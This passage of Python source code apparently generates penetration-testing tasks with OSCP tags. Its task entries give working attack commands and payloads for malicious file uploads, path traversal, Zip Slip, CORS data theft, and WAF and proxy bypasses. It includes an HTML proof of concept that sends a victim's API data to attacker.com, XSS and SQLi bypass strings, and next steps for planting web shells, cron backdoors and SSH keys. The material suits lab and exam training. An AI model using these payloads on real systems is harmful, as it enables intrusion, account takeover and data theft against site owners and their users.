                        'failure_indicators': [
                            '.htaccess upload blocked/renamed',
                            'AllowOverride None (htaccess ignored)',
                            'Apache not used (Nginx, IIS)',
                            'Directory listing shows .htaccess but not honored'
                        ],
                        'next_steps': [
                            'Upload web shell as .png, .txt, .jpg',
                            'Test other directives: php_value auto_prepend_file shell.png',
                            'Directory traversal: upload .htaccess to /var/www/',
                            'Race condition if .htaccess deleted after scan',
                            'Combine with LFI if direct access blocked'
                        ],
                        'alternatives': [
                            'ASP equivalent: web.config (IIS)',
                            'web.config: <handlers><add name="PNG" path="*.png" verb="*" modules="IsapiModule" .../></handlers>',
                            'PHP: .user.ini (if CGI mode): auto_prepend_file=shell.png',
                            'Manual: Test if .htaccess processing enabled first',
                            'Bypass: upload as htaccess.txt, then rename via vuln'
                        ],
                        'tags': ['OSCP:HIGH', 'APACHE', 'CONFIG_INJECT'],
                        'estimated_time': '5 minutes',
                        'notes': 'Only works if: 1) Apache, 2) AllowOverride enabled, 3) .htaccess upload allowed. OSCP common scenario. For IIS use web.config. For PHP-CGI use .user.ini.'
                    }
                },

                # Task 4: Path Traversal Upload
                {
                    'id': f'upload-path-traversal-{port}',
                    'name': 'Path Traversal in File Upload',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit path traversal in filename to upload to arbitrary directories',
                        'command': f'# Test path traversal in filename:\ncurl -X POST {base_url}/upload \\\n  -F "file=@shell.php" \\\n  -F "filename=../../../var/www/html/shell.php"\n\n# Burp Repeater (modify filename in multipart/form-data):\n# Content-Disposition: form-data; name="file"; filename="../../../shell.php"',
                        'flag_explanations': {
                            '../../../var/www/html/': 'Path traversal to web root',
                            'filename=': 'POST parameter controlling upload path',
                            '..\\..\\..\\': 'Windows path traversal',
                            'Content-Disposition': 'Multipart header with filename'
                        },
                        'success_indicators': [
                            'File uploaded outside upload directory',
                            'Shell accessible at traversed path',
                            'Directory traversal successful',
                            'Web root write confirmed'
                        ],
                        'failure_indicators': [
                            'Path normalized before save',
                            'Traversal sequences stripped (../ removed)',
                            'Upload path hardcoded',
                            'Permission denied on target directory'
                        ],
                        'next_steps': [
                            'Upload to web root: ../../var/www/html/',
                            'Overwrite files: ../../index.php',
                            'Upload SSH key: ../../root/.ssh/authorized_keys',
                            'Cron job: ../../etc/cron.d/shell',
                            'Combine with race condition'
                        ],
                        'alternatives': [
                            'Windows: ..\\..\\..\\inetpub\\wwwroot\\shell.aspx',
                            'Double encoding: ..%252f..%252f (if decoded twice)',
                            'URL encoding: ..%2f..%2f',
                            'Mixed separators: ../..\\../file',
                            'Null byte: ../../shell.php%00.png',
                            'Overlong UTF-8: ..%c0%af..%c0%af'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PATH_TRAVERSAL', 'ARBITRARY_WRITE'],
                        'notes': 'Test both GET param (filename=) and POST multipart Content-Disposition. Common targets: /var/www/html, /usr/share/nginx/html, C:\\inetpub\\wwwroot. Needs write permission.'
                    }
                },

                # Task 5: Zip Slip / Archive Extraction
                {
                    'id': f'upload-zip-slip-{port}',
                    'name': 'Zip Slip Vulnerability (Archive Extraction)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit path traversal during ZIP/TAR extraction to write arbitrary files',
                        'command': f'# Create malicious ZIP with path traversal:\nln -s /var/www/html/shell.php shell.php\nzip --symlinks evil.zip shell.php\n# Or:\nprintf "@PK\\x03\\x04" > evil.zip  # ZIP header\n# Use evilarc tool:\npython3 evilarc.py -o unix -d 5 -p var/www/html/ shell.php\n\n# Upload evil.zip to archive upload form',
                        'flag_explanations': {
                            'evilarc.py': 'Tool creating malicious archives with path traversal',
                            '-d 5': 'Depth of ../ traversal (5 levels)',
                            '-p var/www/html/': 'Target path for file write',
                            'zip --symlinks': 'Preserve symbolic links in archive'
                        },
                        'success_indicators': [
                            'File extracted outside intended directory',
                            'Shell written to web root',
                            'Symlink followed during extraction',
                            'Arbitrary file write confirmed'
                        ],
                        'failure_indicators': [
                            'Path sanitized during extraction',
                            'Symlinks not followed',
                            'Extraction fails',
                            'No write permission on target'
                        ],
                        'next_steps': [
                            'Write web shell to document root',
                            'Overwrite .htaccess, index.php',
                            'Write cron job: /etc/cron.d/backdoor',
                            'SSH key: /root/.ssh/authorized_keys',
                            'Test TAR archives (often less protected)'
                        ],
                        'alternatives': [
                            'Evilarc: git clone https://github.com/ptoomey3/evilarc',
                            'Manual ZIP: printf "../../shell.php" | zip evil.zip -',
                            'TAR symlink: ln -s /var/www/html link; tar czf evil.tar.gz link',
                            'Windows: 7z a -tzip evil.zip ..\\..\\..\\inetpub\\wwwroot\\shell.aspx',
                            'Test: Upload plugin/theme ZIP to WordPress'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ZIP_SLIP', 'ARCHIVE'],
                        'notes': 'Common in: WordPress plugins, theme uploads, backup restore, CI/CD artifact uploads. Test if app extracts archives. Evilarc generates payloads for ZIP/TAR. Symlink = alternative attack.'
                    }
                }
            ]
        }

    def _create_cors_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create CORS misconfiguration testing tasks"""
        return {
            'id': f'cors-testing-{port}',
            'name': 'CORS Misconfiguration Testing',
            'type': 'parent',
            'children': [
                # Task 1: CORS Detection
                {
                    'id': f'cors-detection-{port}',
                    'name': 'CORS Misconfiguration Detection',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test for dangerous CORS configurations (reflected Origin, wildcard with credentials)',
                        'command': f'# Test Origin reflection:\ncurl -H "Origin: https://evil.com" -I {base_url}/api/user\n\n# Check for:\n# Access-Control-Allow-Origin: https://evil.com (reflected!)\n# Access-Control-Allow-Credentials: true (dangerous if reflected)',
                        'flag_explanations': {
                            'Origin: https://evil.com': 'Request header indicating cross-origin request',
                            'Access-Control-Allow-Origin': 'Response header allowing specified origin',
                            'Access-Control-Allow-Credentials: true': 'Allows cookies/auth in cross-origin requests',
                            '-I': 'curl flag for HEAD request (headers only)'
                        },
                        'success_indicators': [
                            'Access-Control-Allow-Origin reflects attacker origin',
                            'Access-Control-Allow-Credentials: true present',
                            'Wildcard with credentials (browsers block but shows misconfiguration)',
                            'Null origin allowed'
                        ],
                        'failure_indicators': [
                            'CORS headers not present',
                            'Origin not reflected',
                            'Specific whitelist (only allowed domains)',
                            'No Access-Control-Allow-Credentials'
                        ],
                        'next_steps': [
                            'Test null origin: Origin: null',
                            'Subdomain bypass: Origin: https://evil.target.com',
                            'Test all API endpoints for CORS',
                            'Exploit to steal sensitive data',
                            'Check pre-flight requests (OPTIONS)'
                        ],
                        'alternatives': [
                            'Manual: Burp Repeater - add Origin header, observe response',
                            'Browser DevTools: fetch(url, {credentials: "include"})',
                            'CORScanner: python3 cors_scanner.py -u https://target.com',
                            'Burp Extension: CORS* (scans automatically)',
                            'Test origins: evil.com, null, target.com.evil.com'
                        ],
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'API'],
                        'estimated_time': '5 minutes',
                        'notes': 'Dangerous: Reflected Origin + Allow-Credentials. Test API endpoints (/api/*, /user/*, /admin/*). Many apps validate origin poorly (substring match, regex bypass).'
                    }
                },

                # Task 2: CORS Exploitation
                {
                    'id': f'cors-exploit-{port}',
                    'name': 'Exploit CORS to Steal Sensitive Data',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create PoC to exploit CORS misconfiguration and exfiltrate victim data',
                        'command': f'# Create exploit.html:\ncat > exploit.html <<\'EOF\'\n<script>\nvar req = new XMLHttpRequest();\nreq.onload = function() {{\n  fetch("https://attacker.com/exfil?data=" + btoa(this.responseText));\n}};\nreq.open("GET", "{base_url}/api/user/profile", true);\nreq.withCredentials = true;\nreq.send();\n</script>\nEOF\n\n# Host exploit: python3 -m http.server 80\n# Victim visits: http://attacker-ip/exploit.html',
                        'flag_explanations': {
                            'withCredentials: true': 'Send cookies/auth with cross-origin request',
                            'XMLHttpRequest': 'Browser API for HTTP requests (supports CORS)',
                            'fetch(...)': 'Modern API, also CORS-aware',
                            'btoa(...)': 'Base64 encode response (URL-safe exfil)'
                        },
                        'success_indicators': [
                            'Victim cookies/session sent in request',
                            'Sensitive data received in exploit script',
                            'Exfiltration request on attacker server',
                            'Data successfully stolen'
                        ],
                        'failure_indicators': [
                            'CORS policy blocks request',
                            'withCredentials fails (no Allow-Credentials)',
                            'Browser blocks due to SOP',
                            'No victim interaction'
                        ],
                        'next_steps': [
                            'Exfiltrate user profile, private messages, admin data',
                            'CSRF attack (state-changing requests)',
                            'Chain with XSS for auth bypass',
                            'Test internal network access (if victim on LAN)',
                            'Escalate to account takeover'
                        ],
                        'alternatives': [
                            'Fetch API: fetch(url, {credentials: "include"}).then(r => r.text()).then(exfil)',
                            'Image exfil: new Image().src = "http://attacker/?data=" + data',
                            'WebSocket: if CORS blocks HTTP, try WS',
                            'Service Worker: Advanced persistent exfil',
                            'Manual: Social engineering victim to click link'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOITATION', 'DATA_EXFIL'],
                        'notes': 'CORS vuln = read cross-origin data if victim logged in. Not exploitable without user interaction (phishing). Combine with stored XSS for persistent exploit. Test with own browser first.'
                    }
                },

                # Task 3: CORS Origin Bypass
                {
                    'id': f'cors-origin-bypass-{port}',
                    'name': 'CORS Origin Validation Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass weak origin validation (regex bypass, null origin, subdomain)',
                        'command': f'# Test origin bypass techniques:\ncurl -H "Origin: https://target.com.evil.com" {base_url}/api\ncurl -H "Origin: https://eviltarget.com" {base_url}/api\ncurl -H "Origin: https://target.com%60.evil.com" {base_url}/api\ncurl -H "Origin: null" {base_url}/api\ncurl -H "Origin: https://sub.target.com" {base_url}/api',
                        'flag_explanations': {
                            'target.com.evil.com': 'Subdomain bypass (if check: endsWith("target.com"))',
                            'eviltarget.com': 'Substring match bypass (if check: contains("target.com"))',
                            'Origin: null': 'Null origin (sandboxed iframe, file:// protocol)',
                            'target.com%60.evil.com': 'Backtick bypass (URL parsing confusion)',
                            'sub.target.com': 'Subdomain allowed (register subdomain or subdomain takeover)'
                        },
                        'success_indicators': [
                            'Bypass origin reflected in Allow-Origin',
                            'Null origin accepted',
                            'Subdomain wildcard match',
                            'Regex bypass successful'
                        ],
                        'failure_indicators': [
                            'Strict whitelist (only exact domains)',
                            'All bypass attempts rejected',
                            'Origin validated correctly',
                            'No CORS headers on invalid origin'
                        ],
                        'next_steps': [
                            'If null works: Create exploit in sandboxed iframe',
                            'If subdomain works: Find subdomain takeover',
                            'Regex bypass: Test special chars (@, :, \\, -, _)',
                            'DNS rebinding if network location = auth',
                            'Pre-flight bypass (simple request, no custom headers)'
                        ],
                        'alternatives': [
                            'Null origin iframe: <iframe sandbox="allow-scripts" src="data:text/html,<script>exploit</script>">',
                            'Subdomain takeover: Check for dangling DNS (CNAME to deleted resource)',
                            'Burp Intruder: Fuzz origin header with variations',
                            'Unicode bypass: Use IDN/punycode in origin',
                            'HTTP vs HTTPS: Try http://target.com if app expects https://'
                        ],
                        'tags': ['OSCP:MEDIUM', 'BYPASS', 'REGEX'],
                        'notes': 'Common bypasses: suffix (target.com.evil.com), prefix (eviltarget.com), null origin, underscores (target_com). Test with Burp Intruder. Null origin = sandboxed iframe or local file.'
                    }
                },

                # Task 4: Pre-flight Request Analysis
                {
                    'id': f'cors-preflight-{port}',
                    'name': 'CORS Pre-flight Request Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze OPTIONS pre-flight to identify allowed methods, headers, and CORS policy',
                        'command': f'# Send pre-flight request:\ncurl -X OPTIONS {base_url}/api/admin \\\n  -H "Origin: https://evil.com" \\\n  -H "Access-Control-Request-Method: DELETE" \\\n  -H "Access-Control-Request-Headers: Authorization" \\\n  -i',
                        'flag_explanations': {
                            'OPTIONS': 'HTTP method for pre-flight request',
                            'Access-Control-Request-Method': 'Intended method (PUT, DELETE, PATCH)',
                            'Access-Control-Request-Headers': 'Custom headers client wants to send',
                            'Access-Control-Max-Age': 'Pre-flight cache duration (seconds)'
                        },
                        'success_indicators': [
                            'Access-Control-Allow-Methods includes dangerous methods (DELETE, PUT)',
                            'Access-Control-Allow-Headers: * (all headers allowed)',
                            'Access-Control-Allow-Credentials: true',
                            'Long Max-Age (cache poisoning opportunity)'
                        ],
                        'failure_indicators': [
                            'Pre-flight rejected',
                            'Only safe methods allowed (GET, POST, HEAD)',
                            'Custom headers blocked',
                            'No CORS headers in response'
                        ],
                        'next_steps': [
                            'If DELETE allowed: Test account deletion CSRF',
                            'If Authorization allowed: Credential theft',
                            'Cache poisoning via Max-Age',
                            'Bypass by avoiding pre-flight (use simple request)',
                            'Test for CSRF protection on state-changing endpoints'
                        ],
                        'alternatives': [
                            'Simple request bypass: Use GET/POST, Content-Type: text/plain, no custom headers',
                            'Manual: Burp Repeater - send OPTIONS request',
                            'Browser DevTools Network tab: Filter OPTIONS requests',
                            'Avoid pre-flight: <form method=POST enctype=text/plain>',
                            'Test with actual browser (curl doesn\'t enforce CORS)'
                        ],
                        'tags': ['OSCP:LOW', 'ANALYSIS', 'CSRF'],
                        'notes': 'Pre-flight only for non-simple requests (custom headers, PUT/DELETE, Content-Type: application/json). CORS != CSRF protection. If Allow-Methods: *, test all HTTP verbs.'
                    }
                }
            ]
        }

    def _create_waf_proxy_bypass_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create WAF and Proxy bypass testing tasks"""
        return {
            'id': f'waf-proxy-bypass-{port}',
            'name': 'WAF & Proxy Bypass Techniques',
            'type': 'parent',
            'children': [
                # Task 1: Nginx ACL Bypass with Path Manipulation
                {
                    'id': f'nginx-acl-bypass-{port}',
                    'name': 'Nginx ACL Bypass (Path Normalization)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass Nginx location-based ACL rules using path manipulation characters',
                        'command': f'# Test Nginx path normalization bypass:\n# NodeJS/Express: Use \\xA0 (non-breaking space)\ncurl "{base_url}/admin%C2%A0" -v\n\n# Flask: Use \\x85 (next line)\ncurl "{base_url}/admin%C2%85" -v\n\n# Spring Boot: Use semicolon\ncurl "{base_url}/admin;" -v\n\n# PHP-FPM: Use trailing path\ncurl "{base_url}/admin.php/index.php" -v',
                        'flag_explanations': {
                            '%C2%A0': 'Non-breaking space (\\xA0) - Nginx normalizes differently than NodeJS/Flask',
                            '%C2%85': 'Next Line character (\\x85) - Flask-specific bypass',
                            ';': 'Semicolon path parameter - Spring Boot treats as empty, Nginx as content',
                            '/admin.php/index.php': 'PHP-FPM path info bypass (Nginx blocks /admin.php but not /admin.php/anything)'
                        },
                        'success_indicators': [
                            'Access to restricted path (/admin) granted',
                            'Different response than direct /admin request',
                            'Nginx ACL bypassed (200 instead of 403)',
                            'Backend processes request normally'
                        ],
                        'failure_indicators': [
                            '403 Forbidden on all attempts',
                            'Backend normalizes identically to Nginx',
                            'ACL rules use regex (^/admin)',
                            'Path sanitized before backend processing'
                        ],
                        'next_steps': [
                            'Map all restricted paths: /admin, /api/internal, /config',
                            'Test all bypass chars per backend (see tables below)',
                            'Try combinations: /admin%C2%A0%09 (multiple chars)',
                            'Test other whitespace: \\x09 (tab), \\x0C (form feed)',
                            'Check for case-sensitive bypass: /Admin, /aDmIn'
                        ],
                        'alternatives': [
                            'NodeJS/Express bypass chars (Nginx 1.20.2): \\x09, \\x0C, \\xA0',
                            'Flask bypass chars (Nginx 1.20.2): \\x85, \\xA0, \\x1F, \\x1E, \\x1D, \\x1C, \\x0C, \\x0B',
                            'Spring Boot: semicolon (all Nginx versions)',
                            'Manual: Burp Intruder with whitespace character list',
                            'Prevention: Use location ~* ^/admin (regex match)'
                        ],
                        'tags': ['OSCP:HIGH', 'NGINX', 'ACL_BYPASS', 'PATH_MANIPULATION'],
                        'estimated_time': '10-15 minutes',
                        'notes': 'Research source: https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies. Nginx performs path normalization before ACL check, but backends may normalize differently. Test varies by Nginx version and backend framework. PHP-FPM /admin.php/index.php is classic OSCP technique.'
                    }
                },

                # Task 2: ModSecurity Path Confusion Bypass
                {
                    'id': f'modsec-path-confusion-{port}',
                    'name': 'ModSecurity Path Confusion Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass ModSecurity WAF using path confusion via URL encoding',
                        'command': f'# ModSecurity v3 path confusion (URL-decode bug):\ncurl "{base_url}/foo%3f\';alert(1);foo=" -v\n# ModSec sees path as: /foo\n# Server receives path as: /foo%3f\';alert(1);foo=\n\n# ModSec v2 extension bypass:\ncurl "{base_url}/backup%2ebak" -v\n# Bypasses .bak extension block',
                        'flag_explanations': {
                            '%3f': 'URL-encoded ? (question mark) - ModSec decodes, thinks path ends here',
                            '%2e': 'URL-encoded dot - Bypasses extension-based filters in ModSec v2',
                            'REQUEST_FILENAME': 'ModSec variable improperly implemented (decodes URL before check)',
                            'REQUEST_BASENAME': 'Also affected by decode bug (ModSec v3 < 3.0.12)'
                        },
                        'success_indicators': [
                            'Payload reaches backend unfiltered',
                            'XSS/SQLi executes despite ModSec rules',
                            'Backup file accessed (/backup.bak)',
                            'Extension block bypassed'
                        ],
                        'failure_indicators': [
                            'ModSec blocks request',
                            'Path properly normalized before check',
                            'Updated ModSecurity version (v3 >= 3.0.12)',
                            'WAF logs show rule trigger'
                        ],
                        'next_steps': [
                            'Identify ModSecurity version from headers',
                            'Test all special chars: ?, #, &, =, %',
                            'Try double encoding: %253f (if decoded twice)',
                            'Test REQUEST_BASENAME and PATH_INFO variables',
                            'Combine with XSS/SQLi payloads'
                        ],
                        'alternatives': [
                            'Version detection: Server header or WAF error messages',
                            'Path confusion chars: %3f (?), %23 (#), %26 (&)',
                            'Extension bypass (v2): %2ebak, %2econf, %2ephp',
                            'Manual: Test against ModSec CRS (Core Rule Set)',
                            'Reference: https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MODSECURITY', 'WAF_BYPASS', 'PATH_CONFUSION'],
                        'notes': 'ModSecurity v3 bug (CVE-style) in REQUEST_FILENAME variable - URL-decodes path before applying rules. Fixed in v3.0.12. ModSec v2 has separate extension bypass (.%2ebak). Common in OSCP-style Apache+ModSecurity setups.'
                    }
                },

                # Task 3: AWS WAF Malformed Header Bypass
                {
                    'id': f'aws-waf-header-bypass-{port}',
                    'name': 'AWS WAF Malformed Header Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass AWS WAF using malformed HTTP headers (header continuation)',
                        'command': '# Create malformed header with payload on next line:\n# (Use Burp Repeater for raw request editing)\n# GET / HTTP/1.1\\r\\n\n# Host: TARGET\\r\\n\n# X-Query: Benign-Value\\r\\n\n# \\t\' or \'1\'=\'1\' -- \\r\\n\n# Connection: close\\r\\n\n# \\r\\n\n\n# Tab character at line start = header continuation (RFC violation)',
                        'flag_explanations': {
                            '\\t': 'Tab character at line start (header continuation in HTTP)',
                            'X-Query: Value\\n\\t...': 'Multi-line header value (AWS parses wrong, backend accepts)',
                            'RFC 2616': 'Allows header continuation with leading whitespace (obsolete in RFC 7230)',
                            'NodeJS http module': 'Accepts header continuation despite RFC 7230 deprecation'
                        },
                        'success_indicators': [
                            'SQLi payload reaches backend unfiltered',
                            'AWS WAF logs show clean request',
                            'Backend processes full header value',
                            'Exploitation successful (SQL injection, XSS)'
                        ],
                        'failure_indicators': [
                            'AWS WAF blocks request',
                            'Backend rejects malformed header',
                            'Header properly parsed by both AWS and backend',
                            'Bug patched (NodeJS updated)'
                        ],
                        'next_steps': [
                            'Test all headers: User-Agent, Cookie, Referer, X-*',
                            'Try different continuations: \\t (tab), \\s (space)',
                            'Test SQLi in continued header line',
                            'XSS payloads in multi-line headers',
                            'Test with actual SQLi/XSS exploitation'
                        ],
                        'alternatives': [
                            'Manual: Burp Repeater with raw request editing',
                            'Space continuation: X-Query: Value\\n payload',
                            'Multiple tabs: \\t\\t\\tpayload',
                            'Test backend: NodeJS, Python, PHP (parser differences)',
                            'CRLF injection combined: \\r\\n\\tPayload\\r\\nNew-Header: value'
                        ],
                        'tags': ['OSCP:MEDIUM', 'AWS_WAF', 'HEADER_SMUGGLING', 'ADVANCED'],
                        'notes': 'NodeJS HTTP parser bug (now fixed) allowed header continuation. AWS WAF parsed headers differently than backend. Research: https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies. Test in CTF/lab environments. Modern setups likely patched.'
                    }
                },

                # Task 4: WAF Request Size Limit Bypass
                {
                    'id': f'waf-size-limit-bypass-{port}',
                    'name': 'WAF Request Size Limit Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass WAF inspection by exceeding request body size limits',
                        'command': f'# Generate large request with payload at end:\npython3 << \'EOF\'\nimport requests\njunk = "A" * 65000  # Exceed 64KB limit\npayload = "\' OR 1=1-- "\ndata = {{"param": junk + payload}}\nrequests.post("{base_url}/api/endpoint", data=data)\nEOF\n\n# Burp plugin: nowafpls (auto-adds junk data)',
                        'flag_explanations': {
                            '8 KB': 'AWS WAF limit for ALB/AppSync',
                            '64 KB': 'AWS WAF limit for CloudFront/API Gateway',
                            '128 KB': 'Azure, Akamai, Cloudflare limits',
                            'nowafpls': 'Burp plugin adding junk data to bypass size limits'
                        },
                        'success_indicators': [
                            'Large request accepted (200 OK)',
                            'Payload at end of request executes',
                            'WAF logs show incomplete inspection',
                            'SQLi/XSS successful on oversized request'
                        ],
                        'failure_indicators': [
                            'Request rejected (413 Payload Too Large)',
                            'WAF blocks despite size',
                            'Backend rejects large requests',
                            'Rate limiting triggered'
                        ],
                        'next_steps': [
                            'Test exact size limits: 8KB, 64KB, 128KB',
                            'Payload placement: Beginning vs end of data',
                            'Try GET with large headers (less common)',
                            'Multipart form-data with huge files',
                            'Combine with other bypasses (encoding, obfuscation)'
                        ],
                        'alternatives': [
                            'Burp nowafpls: https://github.com/assetnote/nowafpls',
                            'Manual: Burp Intruder with payload padding',
                            'Base64 padding: Encode junk data (increases size 33%)',
                            'GET URL limit: 8KB for most WAFs (test with long query strings)',
                            'AWS limits: https://docs.aws.amazon.com/waf/latest/developerguide/limits.html'
                        ],
                        'tags': ['OSCP:LOW', 'WAF_BYPASS', 'SIZE_LIMIT', 'AUTOMATED'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'AWS WAF: 8KB (ALB), 64KB (CloudFront). Azure: 128KB. Akamai: 8KB default, 128KB with metadata. Most WAFs stop inspecting after limit. Place payload at end of oversized request. nowafpls Burp plugin automates this.'
                    }
                },

                # Task 5: Unicode Normalization Bypass
                {
                    'id': f'unicode-normalization-bypass-{port}',
                    'name': 'Unicode Normalization Bypass (Full-Width Characters)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass WAF filters using Unicode-compatible characters that normalize to payloads',
                        'command': f'# Full-width Unicode characters:\ncurl "{base_url}/?xss=%EF%BC%9Cimg%20src%E2%81%BC%EF%BD%90%20onerror%E2%81%BC%EF%BC%87prompt%E2%81%BD%EF%BC%91%E2%81%BE%EF%BC%87%EF%B9%A5"\n# Decodes to: <img src=p onerror=\'prompt(1)\'>\n\n# Akamai bypass example:\ncurl "{base_url}/?x=<x/%u003e/tabindex=1%20autofocus/onfocus=x=self;x[%27ale%27%2b%27rt%27](999)>"',
                        'flag_explanations': {
                            '%EF%BC%9C': 'Full-width less-than (＜) normalizes to <',
                            'NFKD normalization': 'Unicode compatibility normalization (converts full-width to ASCII)',
                            '%u003e': 'Unicode escape for > (Akamai URL-decodes multiple times)',
                            'Unicode compatibles': 'Characters sharing normalization: https://www.compart.com/en/unicode'
                        },
                        'success_indicators': [
                            'WAF allows Unicode payload',
                            'Backend normalizes and executes',
                            'XSS/SQLi triggers after normalization',
                            'Payload bypasses filter but still works'
                        ],
                        'failure_indicators': [
                            'WAF normalizes before checking (blocks)',
                            'Backend doesn\'t normalize (no execution)',
                            'Character encoding mismatch',
                            'Unicode stripped/rejected'
                        ],
                        'next_steps': [
                            'Test all Unicode categories: full-width, superscript, subscript',
                            'Try multiple encodings: UTF-8, UTF-16, UTF-7',
                            'Combine with other bypasses (case, encoding)',
                            'Test NFKC, NFKD, NFC, NFD normalization',
                            'Check browser/backend normalization behavior'
                        ],
                        'alternatives': [
                            'Full-width chars: ＜＞＂＇＝（）／',
                            'Superscript: ⁰¹²³⁴⁵⁶⁷⁸⁹',
                            'Subscript: ₀₁₂₃₄₅₆₇₈₉',
                            'Mathematical bold: 𝐚𝐛𝐜𝐝𝐞',
                            'Tool: https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization',
                            'Unicode table: https://www.compart.com/en/unicode'
                        ],
                        'tags': ['OSCP:MEDIUM', 'UNICODE', 'WAF_BYPASS', 'ENCODING'],
                        'notes': 'WAF and backend must normalize differently. Akamai URL-decodes 10x = hide in %2525... CloudFlare, AWS, Imperva have specific bypass payloads. Test with XSS, SQLi, command injection. Full-width Unicode common in Asian language support.'
                    }
                },

                # Task 6: Hop-by-Hop Header Abuse
                {
                    'id': f'hop-by-hop-header-abuse-{port}',
                    'name': 'Hop-by-Hop Header Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Abuse hop-by-hop headers to bypass proxy security controls',
                        'command': f'# Test hop-by-hop header removal:\ncurl -H "X-Forwarded-For: 1.2.3.4" \\\n     -H "Connection: close, X-Forwarded-For" \\\n     {base_url}/admin -v\n# If proxy removes X-Forwarded-For, app sees proxy IP (trusted)\n\n# Test with auth headers:\ncurl -H "Authorization: Bearer token" \\\n     -H "Connection: close, Authorization" \\\n     {base_url}/api/protected -v',
                        'flag_explanations': {
                            'Connection: close, X-Forwarded-For': 'Marks X-Forwarded-For as hop-by-hop (proxy should remove)',
                            'Hop-by-hop headers': 'Headers not meant to be forwarded: Keep-Alive, Transfer-Encoding, TE, Connection, Trailer, Upgrade, Proxy-Authorization, Proxy-Authenticate',
                            'RFC 2616 Section 13.5.1': 'Defines hop-by-hop header behavior',
                            'Proxy misconfiguration': 'Proxy removes header, backend trusts proxy IP'
                        },
                        'success_indicators': [
                            'Access granted to IP-restricted resource',
                            'Header removed by proxy but trusted by backend',
                            'Authentication bypass via header removal',
                            'Different response with hop-by-hop marking'
                        ],
                        'failure_indicators': [
                            'Header forwarded normally (proxy ignores hop-by-hop)',
                            'Backend validates properly',
                            'Access still denied',
                            'No behavior change'
                        ],
                        'next_steps': [
                            'Test all security headers: Authorization, X-API-Key, Cookie',
                            'IP spoofing: X-Forwarded-For, X-Real-IP, X-Originating-IP',
                            'Cache poisoning: Mark caching headers as hop-by-hop',
                            'Session hijacking: Remove Cookie header conditionally',
                            'Test pre-auth vs post-auth endpoints'
                        ],
                        'alternatives': [
                            'Headers to test: Authorization, Cookie, X-API-Key, X-Auth-Token',
                            'IP headers: X-Forwarded-For, X-Real-IP, X-Client-IP, X-Originating-IP',
                            'Standard hop-by-hop: Keep-Alive, Transfer-Encoding, TE, Trailer, Upgrade',
                            'Manual: Burp Repeater with Connection header variations',
                            'Cache poisoning: Connection: close, Set-Cookie',
                            'Tool: Test with curl -H or Burp Suite'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PROXY_ABUSE', 'HEADER_MANIPULATION', 'AUTH_BYPASS'],
                        'notes': 'Reference: https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers. Proxies should remove hop-by-hop headers but many don\'t. Can bypass: IP allowlists, auth checks, caching rules. Test impact: Does backend trust proxy? Does removal change behavior?'
                    }
                },

                # Task 7: Cache Poisoning via Hop-by-Hop
                {
                    'id': f'hop-by-hop-cache-poison-{port}',
                    'name': 'Cache Poisoning via Hop-by-Hop Header',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Poison cache by marking session headers as hop-by-hop',
                        'command': f'# Poison cache with session-specific response:\ncurl -H "Cookie: session=attacker-session-id" \\\n     -H "Connection: close, Cookie" \\\n     {base_url}/ -v\n# Cache stores response WITHOUT seeing Cookie header\n# Future visitors get attacker\'s cached session response',
                        'flag_explanations': {
                            'Connection: close, Cookie': 'Marks Cookie as hop-by-hop for removal',
                            'Cache key': 'URL + headers used to identify cached response',
                            'Cache poisoning': 'Store malicious/session-specific response in public cache',
                            'Session hijacking': 'Victims receive attacker session data from cache'
                        },
                        'success_indicators': [
                            'Cached response contains session-specific data',
                            'Subsequent requests receive poisoned cache',
                            'Other users receive attacker session data',
                            'Cache serves wrong user\'s content'
                        ],
                        'failure_indicators': [
                            'Cookie included in cache key',
                            'Cache properly configured (no hop-by-hop handling)',
                            'Short cache TTL (expires quickly)',
                            'Cache serves correct user-specific content'
                        ],
                        'next_steps': [
                            'Identify cacheable endpoints: GET requests, static assets',
                            'Test cache behavior: Send twice, check if cached',
                            'Poison with sensitive data: user profiles, API responses',
                            'Try other headers: Authorization, X-API-Key',
                            'Monitor cache headers: X-Cache, Age, CF-Cache-Status'
                        ],
                        'alternatives': [
                            'Headers to poison: Cookie, Authorization, X-User-ID',
                            'Cache detection: Look for cache headers in response',
                            'Test tools: Burp Turbo Intruder (race condition)',
                            'Manual: Send request, verify with different client/IP',
                            'Static asset attack: Poison .js GET with header reflection',
                            'Web Cache Deception: https://portswigger.net/research/web-cache-entanglement'
                        ],
                        'tags': ['OSCP:LOW', 'CACHE_POISON', 'HOP_BY_HOP', 'SESSION_HIJACK'],
                        'notes': 'Attack scenario: 1) Send request with session+hop-by-hop, 2) Cache stores response ignoring Cookie, 3) Victims get attacker session from cache. Requires: Misconfigured cache + proxy. Modern CDNs (CloudFlare, Akamai) likely protected. Test in labs/CTFs.'
                    }
                },

                # Task 8: Regex Bypass Collection
                {
                    'id': f'waf-regex-bypass-{port}',
                    'name': 'WAF Regex Bypass Techniques',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Collection of regex bypass techniques for WAF evasion',
